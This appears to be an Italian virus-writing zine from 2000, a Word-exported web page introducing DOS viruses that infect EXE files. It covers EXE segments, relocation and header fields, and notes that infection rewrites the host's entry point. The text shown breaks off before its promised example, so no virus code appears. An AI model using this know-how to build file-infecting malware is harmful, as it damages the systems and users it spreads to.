<html xmlns:v="urn:schemas-microsoft-com:vml"
xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns:w="urn:schemas-microsoft-com:office:word"
xmlns="http://www.w3.org/TR/REC-html40">

<head>
<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
<meta name=ProgId content=Word.Document>
<meta name=Generator content="Microsoft Word 9">
<meta name=Originator content="Microsoft Word 9">
<link rel=File-List href="./MATER_2_file/filelist.xml">
<title>MATER_1</title>
<!--[if gte mso 9]><xml>
 <o:DocumentProperties>
  <o:Subject>zine</o:Subject>
  <o:Author>Familia</o:Author>
  <o:LastAuthor>Administrator</o:LastAuthor>
  <o:Revision>10</o:Revision>
  <o:TotalTime>161</o:TotalTime>
  <o:LastPrinted>2000-11-23T14:26:00Z</o:LastPrinted>
  <o:Created>2000-12-04T11:29:00Z</o:Created>
  <o:LastSaved>2000-12-04T12:03:00Z</o:LastSaved>
  <o:Pages>11</o:Pages>
  <o:Words>4477</o:Words>
  <o:Characters>25519</o:Characters>
  <o:Manager>tutti</o:Manager>
  <o:Company>globale</o:Company>
  <o:Lines>212</o:Lines>
  <o:Paragraphs>51</o:Paragraphs>
  <o:CharactersWithSpaces>31339</o:CharactersWithSpaces>
  <o:Version>9.2812</o:Version>
 </o:DocumentProperties>
</xml><![endif]--><!--[if gte mso 9]><xml>
 <w:WordDocument>
  <w:ActiveWritingStyle Lang="IT" VendorID="3" DLLVersion="517" NLCheck="0">1</w:ActiveWritingStyle>
  <w:HyphenationZone>14</w:HyphenationZone>
  <w:DrawingGridHorizontalSpacing>6 pt</w:DrawingGridHorizontalSpacing>
  <w:DisplayHorizontalDrawingGridEvery>2</w:DisplayHorizontalDrawingGridEvery>
  <w:DisplayVerticalDrawingGridEvery>2</w:DisplayVerticalDrawingGridEvery>
  <w:Compatibility>
   <w:FootnoteLayoutLikeWW8/>
   <w:ShapeLayoutLikeWW8/>
   <w:AlignTablesRowByRow/>
   <w:ForgetLastTabAlignment/>
   <w:LayoutRawTableWidth/>
   <w:LayoutTableRowsApart/>
  </w:Compatibility>
 </w:WordDocument>
</xml><![endif]-->
<style>
<!--
 /* Font Definitions */
@font-face
	{font-family:"MS Mincho";
	panose-1:2 2 6 9 4 2 5 8 3 4;
	mso-font-alt:"\FF2D\FF33 \660E\671D";
	mso-font-charset:128;
	mso-generic-font-family:roman;
	mso-font-pitch:fixed;
	mso-font-signature:1 134676480 16 0 131072 0;}
@font-face
	{font-family:"Arial Unicode MS";
	panose-1:2 11 6 4 2 2 2 2 2 4;
	mso-font-charset:128;
	mso-generic-font-family:modern;
	mso-font-pitch:variable;
	mso-font-signature:-1 -369098753 63 0 4129023 0;}
@font-face
	{font-family:"\@MS Mincho";
	mso-font-charset:128;
	mso-generic-font-family:roman;
	mso-font-pitch:fixed;
	mso-font-signature:-1610612033 1757936891 16 0 131231 0;}
@font-face
	{font-family:"\@Arial Unicode MS";
	mso-font-charset:128;
	mso-generic-font-family:modern;
	mso-font-pitch:variable;
	mso-font-signature:-1 -369098753 63 0 4129023 0;}
 /* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{mso-style-parent:"";
	margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
h1
	{margin-right:0cm;
	mso-margin-top-alt:auto;
	mso-margin-bottom-alt:auto;
	margin-left:0cm;
	mso-pagination:widow-orphan;
	mso-outline-level:1;
	font-size:24.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	mso-font-kerning:18.0pt;
	font-weight:bold;}
h2
	{mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:18.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	mso-outline-level:2;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"MS Mincho";
	color:white;
	font-weight:bold;}
h3
	{mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:18.0pt;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:3;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"MS Mincho";
	color:white;
	font-weight:bold;}
h4
	{margin-right:0cm;
	mso-margin-top-alt:auto;
	mso-margin-bottom-alt:auto;
	margin-left:0cm;
	mso-pagination:widow-orphan;
	mso-outline-level:4;
	font-size:12.0pt;
	font-family:"Arial Unicode MS";
	font-weight:bold;}
h5
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:5;
	font-size:14.0pt;
	mso-bidi-font-size:12.0pt;
	font-family:Arial;
	mso-fareast-font-family:"Times New Roman";
	color:white;
	font-weight:bold;}
h6
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:6;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	color:#CCFFFF;
	font-weight:normal;
	font-style:italic;}
p.MsoHeading7, li.MsoHeading7, div.MsoHeading7
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	text-align:justify;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:7;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	color:#CCFFFF;
	font-style:italic;}
p.MsoHeading8, li.MsoHeading8, div.MsoHeading8
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:8;
	font-size:18.0pt;
	mso-bidi-font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	color:#CCFFFF;}
p.MsoToc1, li.MsoToc1, div.MsoToc1
	{mso-style-update:auto;
	mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoToc2, li.MsoToc2, div.MsoToc2
	{mso-style-update:auto;
	mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:12.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoToc3, li.MsoToc3, div.MsoToc3
	{mso-style-update:auto;
	mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:24.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoToc4, li.MsoToc4, div.MsoToc4
	{mso-style-update:auto;
	mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:36.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoToc5, li.MsoToc5, div.MsoToc5
	{mso-style-update:auto;
	mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:48.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoToc6, li.MsoToc6, div.MsoToc6
	{mso-style-update:auto;
	mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:60.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoToc7, li.MsoToc7, div.MsoToc7
	{mso-style-update:auto;
	mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:72.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoToc8, li.MsoToc8, div.MsoToc8
	{mso-style-update:auto;
	mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:84.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoToc9, li.MsoToc9, div.MsoToc9
	{mso-style-update:auto;
	mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:96.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoFooter, li.MsoFooter, div.MsoFooter
	{margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	tab-stops:center 240.95pt right 481.9pt;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoTof, li.MsoTof, div.MsoTof
	{mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:24.0pt;
	margin-bottom:.0001pt;
	text-indent:-24.0pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoBodyText, li.MsoBodyText, div.MsoBodyText
	{margin:0cm;
	margin-bottom:.0001pt;
	text-align:justify;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoBodyTextIndent, li.MsoBodyTextIndent, div.MsoBodyTextIndent
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:18.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:14.0pt;
	mso-bidi-font-size:12.0pt;
	font-family:Arial;
	mso-fareast-font-family:"MS Mincho";
	color:yellow;
	font-weight:bold;}
p.MsoBodyTextIndent2, li.MsoBodyTextIndent2, div.MsoBodyTextIndent2
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:18.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:14.0pt;
	mso-bidi-font-size:12.0pt;
	font-family:Arial;
	mso-fareast-font-family:"MS Mincho";
	color:#FFCC00;
	font-weight:bold;}
a:link, span.MsoHyperlink
	{color:blue;
	text-decoration:underline;
	text-underline:single;}
a:visited, span.MsoHyperlinkFollowed
	{color:purple;
	text-decoration:underline;
	text-underline:single;}
p.MsoPlainText, li.MsoPlainText, div.MsoPlainText
	{margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:10.0pt;
	font-family:"Courier New";
	mso-fareast-font-family:"Times New Roman";}
p
	{margin-right:0cm;
	mso-margin-top-alt:auto;
	mso-margin-bottom-alt:auto;
	margin-left:0cm;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Arial Unicode MS";}
pre
	{margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt;
	font-size:10.0pt;
	font-family:"Courier New";
	mso-fareast-font-family:"Courier New";}
@page Section1
	{size:595.3pt 841.9pt;
	margin:70.85pt 2.0cm 2.0cm 2.0cm;
	mso-header-margin:35.4pt;
	mso-footer-margin:35.4pt;
	mso-paper-source:0;}
div.Section1
	{page:Section1;}
 /* List Definitions */
@list l0
	{mso-list-id:121769831;
	mso-list-type:hybrid;
	mso-list-template-ids:336890090 68157455 68157465 68157467 68157455 68157465 68157467 68157455 68157465 68157467;}
@list l1
	{mso-list-id:251745478;
	mso-list-type:hybrid;
	mso-list-template-ids:289557600 68157455 68157465 68157467 68157455 68157465 68157467 68157455 68157465 68157467;}
@list l2
	{mso-list-id:1866744515;
	mso-list-type:hybrid;
	mso-list-template-ids:276081776 -327886272 68157443 68157445 68157441 68157443 68157445 68157441 68157443 68157445;}
@list l2:level1
	{mso-level-number-format:bullet;
	mso-level-text:-;
	mso-level-tab-stop:26.5pt;
	mso-level-number-position:left;
	margin-left:25.5pt;
	text-indent:-17.0pt;
	font-family:"Times New Roman";}
ol
	{margin-bottom:0cm;}
ul
	{margin-bottom:0cm;}
-->
</style>
<!--[if gte mso 9]><xml>
 <o:shapedefaults v:ext="edit" spidmax="1027">
  <o:colormru v:ext="edit" colors="#039,#000082,#04047e,#050597,#05058b,#000078"/>
  <o:colormenu v:ext="edit" fillcolor="#000078"/>
 </o:shapedefaults></xml><![endif]--><!--[if gte mso 9]><xml>
 <o:shapelayout v:ext="edit">
  <o:idmap v:ext="edit" data="1"/>
 </o:shapelayout></xml><![endif]-->
</head>

<body bgcolor="#000078" lang=IT link=blue vlink=purple style='tab-interval:
35.4pt'>

<div class=Section1>

<p class=MsoPlainText align=center style='text-align:center'><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>M</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#CCFFFF'>inima </span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>A</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#CCFFFF'>nonyma </span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>T</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#CCFFFF'>abularia </span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>E</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#CCFFFF'>x </span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>R</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#CCFFFF'>eti<o:p></o:p></span></b></p>

<p class=MsoNormal align=center style='margin-left:18.0pt;text-align:center'><i><span
style='font-size:11.0pt;mso-bidi-font-size:12.0pt;mso-fareast-font-family:"MS Mincho";
color:#99CCFF'>nihil vacuum neque sine signo apud </span></i><i><span
style='font-size:11.0pt;mso-bidi-font-size:12.0pt;mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>MATER</span></i><i><span style='font-size:11.0pt;mso-bidi-font-size:
12.0pt;mso-fareast-font-family:"MS Mincho";color:#99CCFF'><o:p></o:p></span></i></p>

<h3><a name="_Ref500557024">Liber Secundus</a></h3>

<p class=MsoNormal align=center style='margin-left:18.0pt;text-align:center'><i><span
style='mso-fareast-font-family:"MS Mincho";color:white'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></i></p>

<p class=MsoNormal align=center style='margin-left:18.0pt;text-align:center'><i><span
style='mso-fareast-font-family:"MS Mincho";color:white'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></i></p>

<h2 style='text-align:justify'><span style='font-family:Arial;font-weight:normal'>Salve,
vera Neumannis proles. <o:p></o:p></span></h2>

<h2 style='text-align:justify'><span style='font-family:Arial;font-weight:normal'>Questa
è la zine ufficiale di Familia, un gruppo che ha come oggetto di studio la
programmazione virale.<o:p></o:p></span></h2>

<h2 style='text-align:justify'><span style='font-family:Arial;font-weight:normal'>MATER
ha come scopo l’esame delle tecniche di programmazione virale e delle
problematiche ad esse associate. MATER è una raccolta di contributi volontari
(e non) di alcuni code-writers del pianeta, in lingua italiana ed è rivolta
soprattutto a chi si avvicina per la prima volta al mondo dei virus e necessita
dei concetti di base che spesso sono dati per scontati nelle zines reperibili
in Rete. Non è, tuttavia, una esemplificazione discorsiva priva di contenuto
tecnico: per comprendere gli esempi ivi contenuti è necessaria una minima
conoscenza dell’architettura di un elaboratore e del linguaggio assembler.<o:p></o:p></span></h2>

<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>

<h2 style='text-align:justify'><span style='font-family:Arial;font-weight:normal'>E’
nostra convinzione che una migliore conoscenza delle metodologie infettive
digitali sia la principale strada per accrescere la sicurezza degli utenti e
fornire un contributo a chi opera nel settore della programmazione. Ritenendo
il vero nemico della sicurezza la disinformazione, auspichiamo che una più
profonda comprensione in questo campo dissipi i dubbi, aiuti la ricerca e
contribuisca al progresso dell’educazione informatica. Sursum Corda !<span
style="mso-spacerun: yes">  </span><o:p></o:p></span></h2>

<h2 style='text-align:justify'><span style='font-family:Arial;font-weight:normal'>Ictus/Familia<o:p></o:p></span></h2>

<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>

<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>

<h5><span style='font-size:16.0pt;mso-bidi-font-size:12.0pt'>ATTENZIONE<o:p></o:p></span></h5>

<p class=MsoNormal style='margin-left:18.0pt;text-align:justify'><span
style='font-family:Arial;color:white'>Questa pubblicazione contiene
informazioni e codice sorgente relativi alla sicurezza informatica. </span><span
style='font-family:Arial;mso-fareast-font-family:"MS Mincho";color:white'>L’obbiettivo
di queste informazioni è di aiutare gli utenti ad accrescere la propria capacità
di programmazione. Questo materiale è a puro scopo didattico e non include
codice distruttivo né documenti attinenti ad alcuna attività illegale. Si
declina ogni responsabilità nel caso chiunque utilizzi le suddette informazioni
per creare, compilare e diffondere intenzionalmente programmi diretti a
danneggiare o interrompere un sistema informatico o telematico, ovvero a
provocarne l'interruzione, totale o parziale, o l'alterazione del suo
funzionamento <i>Art. 615-quinquies (Legge n. 547/93 pubblicata in Gazzetta
Ufficiale n. 305 del 30.12.1993)</i></span><span style='font-family:Arial'><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><i><span style='color:#CCFFFF'><span
style="mso-spacerun: yes">   </span>Cari bambini, eccovi la pappa numero due,
tutta dedicata ai virus infettori di files EXE in ambiente DOS.<o:p></o:p></span></i></p>

<p class=MsoNormal style='text-align:justify'><i><span style='color:#CCFFFF'><span
style="mso-spacerun:
yes">                                                                                                       
</span><span style="mso-spacerun:
yes">                           </span>Milla/Familia<span style="mso-spacerun:
yes">        </span><o:p></o:p></span></i></p>

<p class=MsoPlainText><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoHeading8><b><span style='color:silver'><span style="mso-spacerun:
yes"> </span>§ MATER</span></b><span style='color:silver'> liber secundus <b>§</b><o:p></o:p></span></p>

<p class=MsoNormal><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoBodyTextIndent><span style='color:#FFCC00'>indice<o:p></o:p></span></p>

<p class=MsoBodyTextIndent><span style='font-size:12.0pt;font-family:"Times New Roman";
color:#CCFFFF;font-weight:normal'>L’ambiente DOS: Virus EXE infettori<o:p></o:p></span></p>

<p class=MsoBodyTextIndent><span style='font-size:12.0pt;font-family:"Times New Roman";
color:#CCFFFF;font-weight:normal'><a href="#_1.Generalità"><span
style='color:#CCFFFF'>1. Generalità</span></a><o:p></o:p></span></p>

<p class=MsoBodyTextIndent><span style='font-size:12.0pt;font-family:"Times New Roman";
color:#CCFFFF;font-weight:normal'><a href="#_2._l’header"><span
style='color:#CCFFFF'>2. L’Header</span></a><o:p></o:p></span></p>

<p class=MsoBodyTextIndent><span style='font-size:12.0pt;font-family:"Times New Roman";
color:#CCFFFF;font-weight:normal'><a href="#_3._La_rilocazione"><span
style='color:#CCFFFF'>3. La rilocazione</span></a><o:p></o:p></span></p>

<p class=MsoBodyTextIndent><span style='font-size:12.0pt;font-family:"Times New Roman";
color:#CCFFFF;font-weight:normal'><a href="#_4._Un_esempio"><span
style='color:#CCFFFF'>4. Un esempio</span></a><o:p></o:p></span></p>

<p class=MsoBodyTextIndent><a name=ulteriore></a><span style='font-size:12.0pt;
font-family:"Times New Roman";color:#CCFFFF;font-weight:normal'><a
href="#_STRUTTURE_DI_MEMORIA"><span style='color:#CCFFFF'>appendice: strutture di
memoria dei file COM</span></a><span style="mso-spacerun: yes">  </span><span
class=MsoHyperlink><span style='color:#CCFFFF'><o:p></o:p></span></span></span></p>

<p class=MsoBodyTextIndent><span style='font-family:"Times New Roman";
color:#CCFFFF;font-weight:normal'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
14.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:red'>VIRUS EXE INFETTORI SOTTO DOS <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">         </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes"> </span><o:p></o:p></span></p>

<h1><a name="_1.Generalità"></a><span style='font-size:14.0pt;mso-bidi-font-size:
24.0pt;mso-fareast-font-family:"MS Mincho";color:red;font-weight:normal'>1.Generalità<o:p></o:p></span></h1>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Come già visto nel capitolo relativo ai COM
infettori, i files COM sono i programmi binari più semplici. Essi sono anche
chiamati immagini di memoria. A causa della loro restrizione a 64 K (la misura
di un segmento), i programmi COM non sono più usati e nell’ambiente Windows
stanno scomparendo, sebbene siano ancora utilizzati per piccole applicazioni.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>La principale differenza di un programma EXE è che
la misura di quest’ultimo non è limitata a 64 K. Questo significa che la misura
di un EXE non ha limiti se non quelli imposti dalla quantità di memoria del
proprio HD. D’altra parte un programma più grande di 64K non può essere
caricato ed eseguito in un singolo segmento. Un programma EXE consiste di più
segmenti, per il codice, lo stack e i dati.<span style="mso-spacerun: yes"> 
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Un’altra importante caratteristica è che un EXE può
essere caricato in qualsiasi allocazione di memoria (a differenza
dell’indirizzo 100H del COM). Questo fatto impone un aggiustamento di tutte le
istruzioni che contengono indirizzi di segmento, come<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">     </span>*
JMP/CALL FAR PTR <i>nome<o:p></o:p></i></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">     </span>* MOV
reg, SEG <i>nome<o:p></o:p></i></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">     </span>* MOV
reg_seg, <i>valore<o:p></o:p></i></span></p>

<p class=MsoPlainText style='text-align:justify'><i><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></i></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Il processo è chiamato “rilocazione”, ed è eseguito
quando l’EXE è caricato in memoria.<span style="mso-spacerun: yes">  </span>Nel
processo di infezione l’header del file host viene modificato l’indirizzo di
partenza (CS:IP), così come la lunghezza dell’host.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<h1><a name="_2._l’header"></a><span style='font-size:14.0pt;mso-bidi-font-size:
24.0pt;mso-fareast-font-family:"MS Mincho";color:red'>2. l’header<span
style="mso-spacerun: yes">    </span><o:p></o:p></span></h1>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>L’EXE deve quindi contenere, assieme ai segmenti di codice,
un’area che contiene a sua volta informazioni sui simboli di rilocazione,
l’indirizzo di partenza, l’indirizzo del segmento di stack etc. Queste
informazioni<span style="mso-spacerun: yes">  </span>sono immagazzinate nella
prima parte dell’EXE, chiamata <b>header</b>.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>struttura dell’header:<span style="mso-spacerun:
yes">   </span><span style="mso-spacerun: yes"> </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
